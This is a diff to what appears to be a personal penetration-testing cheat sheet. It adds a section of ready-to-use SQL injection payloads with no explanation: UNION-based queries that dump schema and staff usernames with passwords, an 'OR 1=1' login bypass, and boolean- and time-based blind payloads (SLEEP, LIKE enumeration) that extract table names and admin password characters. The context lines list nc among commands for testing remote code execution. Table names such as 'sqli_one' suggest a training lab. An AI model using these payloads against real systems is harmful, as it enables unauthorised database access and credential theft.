@@ -92,7 +92,25 @@ python3 -m http.server 8000                                                     
 Linux command: whoami, ls, ping, sleep, nc                                         # Commands for test RCE
 Windows commnad: whoami, dir, ping, timeout 
 
-
+########################          SQL          #####################################
+~~~~~~~~~~~~~~~~~~~~~~       inband\error-based     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+UNION SELECT 1,2,database()
+UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+FROM information_schema.tables WHERE table_schema = '' 
+FROM information_schema.columns WHERE table_name = ''
+0 UNION select 1,2, group_concat(username, ':', password SEPARATOR '<br>' ) FROM staff_users 
+~~~~~~~~~~~~~~~~~~~~~~       blind\bypass-based     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+' OR 1=1;--
+~~~~~~~~~~~~~~~~~~~~~~       blind\boolean-based    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+?username=admin123' UNION select 1,2,3 where database() like 'a%';--
+?username=admin123' UNION select 1,2,3 from information_schema.tables where table_schema = 'sqli_three' and table_name like 'a%';--
+?username=admin123' UNION select 1,2,3 from information_schema.columns where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'a%';--
+?username=admin123' UNION  SELECT 1,2,3 from users where username like 'ad%' -- 
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+~~~~~~~~~~~~~~~~~~~~~~        blind\time-based      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 
 ####################################################################################
 
